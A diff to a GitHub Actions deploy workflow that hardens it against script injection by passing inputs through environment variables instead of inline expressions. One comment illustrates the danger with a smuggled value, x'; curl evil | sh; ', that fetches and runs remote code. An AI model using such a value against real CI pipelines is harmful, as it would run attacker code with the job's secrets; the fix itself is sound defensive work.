@@ -30,6 +30,19 @@ jobs:
     name: ${{ inputs.environment }}
     runs-on: ubuntu-latest
     timeout-minutes: 20
+    # EVERY INPUT REACHES A SHELL AS AN ENVIRONMENT VARIABLE, NEVER AS `${{ }}`.
+    #
+    # An expression inside `run:` is pasted into the script text before bash ever
+    # sees it, so an input is source code: a digest of `x'; curl evil | sh; '`
+    # would run, with this job's secrets in its environment. The caller passes
+    # digests it computed itself today, but `workflow_call` inputs are strings and
+    # this file cannot know who calls it tomorrow. As a variable the value is data
+    # whatever it contains, and bash quoting is what keeps it so.
+    env:
+      DEPLOY_ENVIRONMENT: ${{ inputs.environment }}
+      API_DIGEST: ${{ inputs.api_digest }}
+      WEB_DIGEST: ${{ inputs.web_digest }}
+      DEPLOY_REF: ${{ github.sha }}
     # THE APPROVAL GATE, and it is the environment's rather than this file's.
     # A GitHub Environment named `production` with required reviewers is what
     # makes a tag wait for a person; one named `staging` with none is what makes
@@ -61,17 +74,17 @@ jobs:
           if [ -z "${HOOK}" ]; then
             echo "configured=false" >> "$GITHUB_OUTPUT"
             {
-              echo "### ${{ inputs.environment }} is not configured"
+              echo "### ${DEPLOY_ENVIRONMENT} is not configured"
               echo
               echo 'No `DEPLOY_HOOK_URL` secret is set for this environment, so nothing was deployed.'
               echo 'The images are built and published; see `ops/deploy/README.md` for what to configure.'
               echo
               echo "| Image | Digest |"
               echo "|---|---|"
-              echo "| api | \`${{ inputs.api_digest }}\` |"
-              echo "| web | \`${{ inputs.web_digest }}\` |"
+              echo "| api | \`${API_DIGEST}\` |"
+              echo "| web | \`${WEB_DIGEST}\` |"
             } >> "$GITHUB_STEP_SUMMARY"
-            echo "::warning title=Not deployed::${{ inputs.environment }} has no DEPLOY_HOOK_URL. See ops/deploy/README.md."
+            echo "::warning title=Not deployed::${DEPLOY_ENVIRONMENT} has no DEPLOY_HOOK_URL. See ops/deploy/README.md."
             exit 0
           fi
           echo "configured=true" >> "$GITHUB_OUTPUT"
@@ -89,10 +102,10 @@ jobs:
         run: |
           set -euo pipefail
           payload=$(jq -nc \
-            --arg environment '${{ inputs.environment }}' \
-            --arg api '${{ inputs.api_digest }}' \
-            --arg web '${{ inputs.web_digest }}' \
-            --arg ref '${{ github.sha }}' \
+            --arg environment "${DEPLOY_ENVIRONMENT}" \
+            --arg api "${API_DIGEST}" \
+            --arg web "${WEB_DIGEST}" \
+            --arg ref "${DEPLOY_REF}" \
             '{environment: $environment, images: {api: $api, web: $web}, ref: $ref}')
 
           # `--fail-with-body`: a hook that answers 500 with an explanation must
@@ -121,12 +134,12 @@ jobs:
           set -euo pipefail
           for attempt in $(seq 1 60); do
             if curl --fail --silent --show-error --max-time 5 "${HEALTH}" > /dev/null; then
-              echo "::notice title=Ready::${{ inputs.environment }} answered its readiness probe."
+              echo "::notice title=Ready::${DEPLOY_ENVIRONMENT} answered its readiness probe."
               exit 0
             fi
             sleep 5
           done
-          echo "::error title=Not ready::${{ inputs.environment }} did not become ready within five minutes."
+          echo "::error title=Not ready::${DEPLOY_ENVIRONMENT} did not become ready within five minutes."
           echo 'Roll back with **Run workflow** and the previous digest — see ops/deploy/README.md.'
           exit 1
 
@@ -134,12 +147,12 @@ jobs:
         if: steps.configured.outputs.configured == 'true'
         run: |
           {
-            echo "### Deployed to ${{ inputs.environment }}"
+            echo "### Deployed to ${DEPLOY_ENVIRONMENT}"
             echo
             echo "| Image | Digest |"
             echo "|---|---|"
-            echo "| api | \`${{ inputs.api_digest }}\` |"
-            echo "| web | \`${{ inputs.web_digest }}\` |"
+            echo "| api | \`${API_DIGEST}\` |"
+            echo "| web | \`${WEB_DIGEST}\` |"
             echo
             echo 'Keep these. A rollback is **Run workflow** with the digest that was here before.'
           } >> "$GITHUB_STEP_SUMMARY"
